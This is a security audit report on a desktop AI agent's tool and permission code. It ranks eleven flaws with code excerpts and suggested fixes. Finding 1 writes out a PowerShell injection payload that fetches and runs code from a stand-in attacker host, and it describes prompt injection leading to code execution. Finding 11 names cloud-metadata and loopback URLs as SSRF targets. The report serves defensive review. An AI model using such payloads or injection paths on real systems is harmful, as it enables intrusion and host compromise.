# Tools & Permissions Audit — findings

**Date:** 2026-10-03
**Auditor:** Tools/Security Auditor (read-only; no `src/` files modified)
**Scope:** `cline/blackrose/src/tools/*.ts` (19 files), `src/core/permissions.ts`, `src/core/agent.ts`, `src/core/taskEngine.ts`
**Method:** every finding below was traced from tool input → `run()` / `requiresApproval()` → sink; the non-obvious ones were re-verified by executing the relevant JS/PowerShell expression. Companion files read for tracing only: `src/core/tools.ts`, `src/core/processes.ts`, `src/schedule/runner.ts`, `src/index.ts`.

Out of scope by instruction and therefore not reported: `csp:null` in `tauri.conf.json`, the remote-updater capability grant, the ~6-minute update-banner poll.

---

## Summary table (ranked by severity)

| # | Sev | Category | Location | Finding | Status |
|---|-----|----------|----------|---------|--------|
| 1 | **HIGH** | Injection | `src/tools/install.ts:39,44` | Package-name filter misses PowerShell `$(...)`/backtick → arbitrary command execution | CONFIRMED |
| 2 | **MEDIUM** | Fail-open logic | `src/core/taskEngine.ts:128` | Goal verification reports `verified:true` for "NOT VERIFIED" | CONFIRMED |
| 3 | **MEDIUM** | Approval mismatch | `src/tools/voice.ts:126-133` | Whitespace-only `path` makes the prompt say "transcribes a WAV file" while the MIC opens | CONFIRMED |
| 4 | **MEDIUM** | Fail-open | `src/tools/schedule.ts:99-112` | `every_minutes ≤ 0` creates a schedule that can never fire, reported as success | CONFIRMED |
| 5 | **MEDIUM** | Logic inversion | `src/tools/schedule.ts:74-77` | `daily_at` mixes a UTC date with local hours → task fires twice or is skipped outside UTC | CONFIRMED |
| 6 | **MED-LOW** | Supply chain | `src/tools/video.ts:43-55` | yt-dlp.exe auto-downloaded and executed with no integrity check | CONFIRMED |
| 7 | LOW | Unbounded growth | `src/core/processes.ts:22,70` | Background-job registry never trimmed (≤200 KB retained per job) | CONFIRMED |
| 8 | LOW | Data loss | `src/tools/memory.ts:11-12` | `slug()` truncates keys at 80 chars with no hash → two keys silently overwrite each other | CONFIRMED |
| 9 | LOW | Error handling | `src/tools/files.ts:25,113`; `src/tools/desktop.ts:71` | `read_file` / `list_dir` / `read_image` throw ENOENT where siblings return `isError` | CONFIRMED |
| 10 | LOW | Dead condition | `src/tools/files.ts:56-57` | Both `write_file` approval branches return `null`; the `existsSync` distinction is unreachable | CONFIRMED |
| 11 | INFO | SSRF (by design) | `src/tools/web.ts:37-45`; `src/tools/knowledge.ts:558-567` | `web_fetch` / `learn_url` fetch any http(s) URL ungated, incl. loopback and cloud metadata | CONFIRMED |

---
## 1. HIGH — `install` allows PowerShell command injection through the package name

**`src/tools/install.ts:39`**, sink at **`src/tools/install.ts:44`**

```ts
if (!pkg || /[\r\n;&|]/.test(pkg)) return { content: 'Invalid package name.', isError: true }
...
const out = await execShell(recipe.command(pkg), ctx.cwd, recipe.timeout)
```

`RECIPES` (`install.ts:13-18`) builds the command by raw template interpolation, e.g.
`` `npm install -g ${p}` ``. `execShell` (`src/core/processes.ts:25-30`) runs it as
`powershell.exe -NoProfile -NonInteractive -Command <command>`.

The denylist blocks `\r \n ; & |` only. PowerShell command substitution `$( ... )`,
backtick escapes, `<`, `>`, `'` and `"` all pass the filter and are still parsed by the
shell. Verified live:

```
> powershell.exe -Command "Write-Output npm install -g harmless`$(Get-Process -Id `$PID ...)"
npm install -g harmlesspowershell        # subexpression EXECUTED
```

A model-supplied `package` of `evil$(irm http://attacker/x | iex)` therefore runs
arbitrary PowerShell, while the approval prompt shows only
`Install software on this machine: npm → evil$(irm ...)` — the user reads the package
string, not the expanded command. Because `package` is model-controlled and the prompt
wording does not imply shell evaluation, this is a realistic prompt-injection → RCE
path, not just a theoretical metacharacter issue.

**Impact:** arbitrary code execution on the host.
**Fix direction:** allowlist-validate `pkg` (e.g. `/^[A-Za-z0-9@._\-+]+$/`, or per-manager
rules), or pass it as a single quoted argument with `'` doubling. A denylist is not a
shell boundary.

---

## 2. MEDIUM — goal verification fails open on "NOT VERIFIED"

**`src/core/taskEngine.ts:128`**

```ts
const verified = /VERIFIED/.test(vOut.text) && !/NOT_VERIFIED/.test(vOut.text)
```

`NOT_VERIFIED` is the only negation the code knows about. Any other phrasing a model
naturally produces satisfies the first test and slips past the second. Verified:

```
'NOT VERIFIED - the file was missing'  -> verified = true
'NOT VERIFIED'                        -> verified = true
```

The verifier is only *asked* for "exactly VERIFIED or NOT_VERIFIED"
(`taskEngine.ts:114`); nothing constrains its prose, and there is no second check. So
`runGoal` returns `verified: true` for a goal it never verified, and that value is what
callers render as done.

**Fix direction:** reject the negation first with a tolerant pattern
(`/NOT[\s_]*VERIFIED\b/`), then require a standalone `VERIFIED` token.
## 3. MEDIUM — the `listen` approval prompt can describe the wrong action

**`src/tools/voice.ts:126-133`**

```ts
requiresApproval: (input, _ctx) =>
  input?.path
    ? 'Transcribes the WAV file with the local Windows dictation engine (offline; …)'
    : 'Opens the MICROPHONE and listens locally (…)',
run: async (input, ctx) => {
  const wavArg = str(input, 'path').trim()
  if (!wavArg) { /* mic path */ }
```

The gate tests the **raw** `input.path`; the run path tests the **trimmed** value.
Verified: `path: "   "` → the prompt takes the file branch, `run` takes the mic branch.
The user approves "transcribes a file" and the microphone opens. The mic is the
privacy-sensitive effect in this tool, so the prompt text is the control.

**Fix direction:** gate on `str(input,'path').trim()` — the exact predicate `run` uses.

---

## 4. MEDIUM — a schedule with `every_minutes ≤ 0` is created and can never fire

**`src/tools/schedule.ts:99-112`**

```ts
const everyMinutes = input.every_minutes === undefined ? undefined : num(input, 'every_minutes', 0)
const dailyAt = str(input, 'daily_at') || undefined
if (!everyMinutes && !dailyAt) return { content: 'Provide every_minutes or daily_at.', isError: true }
...
everyMinutes: everyMinutes && everyMinutes > 0 ? Math.max(1, Math.round(everyMinutes)) : undefined,
```

With `every_minutes: -5` the guard `!everyMinutes` is false, so validation passes, but
the stored `everyMinutes` is `undefined` and `dailyAt` is `undefined` too. Verified
against `isDue` (`schedule.ts:67-80`): the schedule is **never** due. The tool still
returns success, and its message reads `daily at undefined`. The user gets a persistent
task that silently never fires — a fail-open "task created" report.

**Fix direction:** reject non-positive `every_minutes` in the validation branch
(`everyMinutes !== undefined && everyMinutes < 1` → `isError`), and refuse to persist a
schedule with neither field set.

---

## 5. MEDIUM — `daily_at` compares a UTC date against local hours

**`src/tools/schedule.ts:74-77`**

```ts
const today = now.toISOString().slice(0, 10)          // UTC date
if (s.lastRun && s.lastRun.slice(0, 10) === today) return false
const [h, m] = s.dailyAt.split(':').map(Number)
return now.getHours() > h || (now.getHours() === h && now.getMinutes() >= m)  // LOCAL hours
```

`lastRun` is written by `src/schedule/runner.ts:43,48` as `new Date().toISOString()`
(UTC). The "already ran today" latch is therefore a **UTC** date, while the fire
condition is **local** wall-clock. The two agree only at UTC+00:00.

In any zone behind UTC (the Americas), a task set for e.g. `20:00` fires at local 20:00
on day *D*; by then the UTC date has often already rolled to *D+1*, so the latch no
longer matches `lastRun` and the task fires **again the same local evening**, then is
blocked for the following day. In zones ahead of UTC the mirror image happens: the task
can be skipped for a whole local day.

**Fix direction:** compute the calendar day in local time on both sides, or compare
timestamps rather than date strings.

## 6. MED-LOW — yt-dlp is auto-downloaded and executed without integrity verification

**`src/tools/video.ts:43-55`**

```ts
const res = await fetch(YTDLP_URL, { redirect: 'follow', signal: AbortSignal.timeout(600_000) })
if (!res.ok || !res.body) throw new Error(`yt-dlp download failed: HTTP ${res.status}`)
fs.writeFileSync(dest, Buffer.from(await res.arrayBuffer()))
return dest
```

When no local copy exists, `watch_video` fetches an executable from a
`.../releases/latest/download/...` URL (a mutable "latest" pointer) over the network and
immediately executes it (`video.ts:109,123`) via `execShell`. There is no checksum, no
signature, no content-type check, and it lands in `~/.blackrose/bin`. Compromise of the
release asset, a MITM on a misconfigured network, or a tampered `USERPROFILE` all yield
code execution. The call is approval-gated, but the prompt text (`video.ts:92-93`)
mentions only "downloads the video … and sends its audio to the cloud STT API" — it
never discloses that a new binary may be installed.

**Fix direction:** pin a version + SHA-256, verify before writing/executing, and mention
the install in the approval reason.

---

## 7. LOW — background-job registry grows without bound

**`src/core/processes.ts:22,58-96`**

```ts
const jobs = new Map<string, Job>()
...
jobs.set(id, job)     // never deleted
```

`killJob` (`:98-103`) sends `taskkill` but never removes the entry, and `close`
(`:88-94`) only flips the status. Every `run_command` with `background:true` leaves a
`Job` behind holding up to `MAX_JOB_OUTPUT` = 200 KB of captured output
(`processes.ts:20,50`) for the whole process lifetime. A long-running desktop session
that launches a few hundred background jobs retains tens of MB that nothing can reclaim
(no eviction, no persistence — pure waste).

**Fix direction:** evict finished jobs beyond a cap and cap per-job output lower, or
clear `output` in the `close` handler.

---

## 8. LOW — memory keys collide after 80 characters

**`src/tools/memory.ts:11-12,43`**

```ts
const slug = (key) => key.toLowerCase().replace(/[^a-z0-9-_]+/g, '-').replace(/^-+|-+$/g, '').slice(0, 80) || 'note'
const p = path.join(memoryPath(ctx.dataDir), `${slug(key)}.md`)
```

Two distinct keys sharing their first 80 slug characters map to the same file, and
`memory_save` overwrites it (`memory.ts:46`) — the first memory is destroyed with no
warning. The identical hazard was already recognised and fixed in the knowledge store:
`knowledge.ts:48-61` appends `hash8(source)` when truncating and says so explicitly
("otherwise two paths sharing their first SLUG_MAX characters would silently overwrite
each other's learned document"). `memory.ts` was not given the same treatment.

**Fix direction:** reuse `hash8` on the full key when the slug is truncated.

---

## 9. LOW — path tools throw where their siblings return `isError`

**`src/tools/files.ts:25`** (`read_file`), **`:113`** (`list_dir`),
**`src/tools/desktop.ts:71`** (`read_image`)

```ts
const stat = fs.statSync(p)                 // throws ENOENT — no existsSync guard
...
const entries = fs.readdirSync(p, { withFileTypes: true })   // same
```

The comparable tools all guard and return a structured error: `ocr.ts:32`,
`stt.ts:66`, `voice.ts:145` → `{ content: 'File not found: …', isError: true }`.
`agent.ts:259-263` catches the throw and converts it to `Tool 'read_file' failed: ENOENT…`,
so the model still sees an error — but direct callers (the UI, `bridge/server.ts`, tests)
get an unhandled exception instead of a `ToolResult`. Inconsistent failure contract
across sibling tools in the same file.

**Fix direction:** `if (!fs.existsSync(p)) return { content: 'File not found: …', isError: true }`.

---

## 10. LOW — `write_file`'s approval predicate has an unreachable distinction

**`src/tools/files.ts:54-59`**

```ts
if (isInsideWorkspace(ctx.cwd, p) && fs.existsSync(p)) return null // in-workspace edit of known file
if (isInsideWorkspace(ctx.cwd, p)) return null                     // in-workspace creation
return writeApprovalReason('Write file', p, ctx.cwd)
```

Both in-workspace branches return `null`, so the `fs.existsSync` test (an extra stat on
every gated call) can never change the outcome. The comments imply the author intended
overwriting a known file to be treated differently from creating a new one; as written
the two branches are equivalent — either the distinction is dead or one branch is
missing. This is **not** a bypass today: outside-workspace writes still reach the
approval prompt (verified: `..\..\Windows\...` → `isInsideWorkspace === false`).

**Fix direction:** collapse to one condition, or restore the intended behaviour and
state it in the tool description.

---

## 11. INFO — ungated URL fetch reaches loopback and cloud metadata (by design)

**`src/tools/web.ts:37-45`**, **`src/tools/knowledge.ts:558-567`**

`web_fetch` and `learn_url` accept any `http(s)` URL with no host restriction and no
approval. A model — or an injected instruction in fetched/learned content — can request
`http://127.0.0.1:<port>/…`, `http://169.254.169.254/latest/meta-data/iam/…`, or a LAN
address, and the response body is returned verbatim into the conversation; in
`learn_url`'s case it is also persisted into the knowledge base for later retrieval.
`learn_folder` has the same shape for files: `resolveInWorkspace` resolves `..` segments
freely, so arbitrary absolute paths outside the workspace can be read and ingested.

This follows the stated constitution (`permissions.ts:5-7`: "Reads are free"), so it is
a deliberate calibration rather than an oversight — but "reads are free" and "fetch an
attacker-chosen internal URL and hand it to the model provider" are not the same risk
class. Worth an explicit decision plus a same-host/private-range blocklist.

---

## Categories with no findings

- **Write path traversal (category 2):** none found. `resolveInWorkspace`
  (`permissions.ts:9-11`) does resolve `..\..\` segments, but every write tool routes the
  resolved path through `isInsideWorkspace` (`permissions.ts:13-16`) before acting —
  verified with `cwd=C:\ws`, `target=..\..\Windows\System32\drivers\etc\hosts` →
  `inside = false` → approval prompt raised. Gates at `files.ts:54`, `files.ts:82`,
  `undo.ts:54`. Windows case-insensitivity and `path.relative` semantics are correct
  here; a leading-dot filename such as `..foo` is a false *positive* (an extra prompt),
  which is fail-closed. Symlink/junction escapes on the *write* path are not defended
  against, but they are gated by the same approval whenever the resolved path lands
  outside the workspace.
- **Shell/SQL/HTML injection elsewhere (category 3):** the other concatenations into
  PowerShell are correctly escaped — `desktop.ts:121,125` (`'` doubled; SendKeys
  specials escaped for `type`), `voice.ts:74,150-151,207` (`'` doubled, newlines
  stripped), `video.ts:75,109,123` (`q()` doubles `'`), and `web.ts:59`
  (`encodeURIComponent`). HTML is only ever stripped, never constructed
  (`web.ts:5-17`). `install` (finding 1) is the one exception.
- **Approval-gate bypass by a tool omitting `requiresApproval` (category 1):** every tool
  that performs an external effect declares a gate — `shell.ts:18,81`, `install.ts:32`,
  `desktop.ts:30,100`, `voice.ts:126`, `stt.ts:52`, `video.ts:92`, `skills.ts:19`,
  `schedule.ts:96` — plus a manual `ctx.askApproval` in `instagram.ts:165`.
  `memory_*`, `project_*`, `goal_*`, `decision_*` and `learn_*` write only inside
  `dataDir`, and that exemption is documented and deliberate (`goals.ts:18-28`).
  `buildTool` (`core/tools.ts:49-51`) defaults `requiresApproval` to `null`, so an
  ungated tool must opt out silently — the one place that matters (finding 3) is a
  mismatch *inside* a gate, not a missing one. Two cross-tool calls skip a nested gate —
  `video.ts:143` invokes `transcribeAudioTool.run` directly and `instagram.ts:250,262`
  invokes `learnFileTool.run` — but in both cases the outer tool's own approval reason
  already discloses the STT hop / the local file, so no additional effect escapes.
  Unattended scheduled runs fail closed (`schedule/runner.ts:56-63` auto-denies unless
  `BLACKROSE_SCHEDULE_APPROVE=all`), and non-interactive CLI runs fail closed
  (`index.ts:149-161`).
- **Category 5, silent-success reporting:** apart from findings 2, 4 and 9, the error
  paths are consistent — `shell.ts:32` sets `isError` from the exit code, `install.ts:47`,
  `stt.ts:96-108` and `ocr.ts:39-50` all convert failures to `isError`, and the
  intentionally-recovered cases (`video.ts:169-170`, `instagram.ts:192-205`) say in the
  message text that something failed.

---

## Verification notes

Three findings were confirmed by executing the exact expression rather than by reading
it alone: the PowerShell sub-expression expansion in finding 1 (a live
`powershell.exe -Command` run), the `isInsideWorkspace` escape result quoted in
"Categories with no findings", and the `NOT VERIFIED` / `every_minutes` / whitespace-`path`
evaluations in findings 2, 3 and 4. All other findings are read from the source with the
cited lines and their data flow traced by hand; each is marked CONFIRMED in the sense of
"the code path exists and the stated input reaches the stated sink", not "exploited in a
live run".
---

